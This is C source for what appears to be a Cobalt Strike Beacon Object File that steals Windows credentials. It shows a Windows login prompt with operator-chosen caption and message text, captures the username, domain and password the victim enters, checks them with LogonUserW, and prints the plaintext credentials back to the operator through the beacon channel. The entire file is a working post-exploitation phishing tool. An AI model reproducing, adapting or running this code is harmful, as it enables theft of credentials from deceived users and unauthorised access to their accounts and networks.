#include <windows.h>
#include <wincred.h>

#include "beacon.h"


DECLSPEC_IMPORT DWORD WINAPI CREDUI$CredUIPromptForWindowsCredentialsW(PCREDUI_INFOA pUiInfo, DWORD dwAuthError, ULONG* pulAuthPackage, LPCVOID pvInAuthBuffer, ULONG ulInAuthBufferSize, LPVOID* ppvOutAuthBuffer, ULONG* pulOutAuthBufferSize, BOOL* pfSave, DWORD dwFlags);
DECLSPEC_IMPORT DWORD WINAPI CREDUI$CredUnPackAuthenticationBufferW(DWORD dwFlags, PVOID pAuthBuffer, DWORD cbAuthBuffer, LPSTR pszUserName, DWORD* pcchlMaxUserName, LPSTR pszDomainName, DWORD* pcchMaxDomainName, LPSTR pszPassword, DWORD* pcchMaxPassword);
WINBASEAPI DWORD WINAPI ADVAPI32$LogonUserW(LPCSTR lpszUsername, LPCSTR lpszDomain, LPCSTR lpszPassword, DWORD dwLogonType, DWORD dwLogonProvider, PHANDLE phToken);


void launch(char * args, int alen)
{
	datap parser;
	BeaconDataParse(&parser, args, alen);

	CREDUI_INFO ci = { sizeof(ci) };
	wchar_t* promptCaption = (WCHAR*) BeaconDataExtract(&parser, NULL);
	wchar_t* promptMessage = (WCHAR*) BeaconDataExtract(&parser, NULL);

	ci.pszCaptionText = (PCWSTR)promptCaption;
	ci.pszMessageText = (PCWSTR)promptMessage;

	DWORD result = 0;

	ULONG pulAuthPackage = 0;
	LPVOID ppvOutAuthBuffer = NULL;
	ULONG pulOutAuthBufferSize = 0;
	BOOL pfSave = FALSE;


	result = CREDUI$CredUIPromptForWindowsCredentialsW(
		&ci, 0, &pulAuthPackage, NULL, 0, &ppvOutAuthBuffer, &pulOutAuthBufferSize, &pfSave, 1
	);

	wchar_t pszUserName[256];
	DWORD pcchlMaxUserName = 256;
	wchar_t pszDomainName[256];
	DWORD pcchMaxDomainName = 256;
	wchar_t pszPassword[256];
	DWORD pcchMaxPassword = 256;

	if (CREDUI$CredUnPackAuthenticationBufferW(
		0,
		ppvOutAuthBuffer,
		pulOutAuthBufferSize,
		pszUserName,
		&pcchlMaxUserName,
		pszDomainName,
		&pcchMaxDomainName,
		pszPassword,
		&pcchMaxPassword))
	{

		HANDLE newToken = NULL;
		if (ADVAPI32$LogonUserW(pszUserName, pszDomainName, pszPassword, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &newToken)) {
			BeaconPrintf(CALLBACK_OUTPUT, "Valid Credential\n\tDomain: %ls\n\tUsername: %ls\n\tPassword: %ls", pszDomainName, pszUserName, pszPassword);
		}
		else {
			BeaconPrintf(CALLBACK_OUTPUT, "Invalid Credential\n\tDomain: %ls\n\tUsername: %ls\n\tPassword: %ls", pszDomainName, pszUserName, pszPassword);
		}


	}
	

	return 0;
}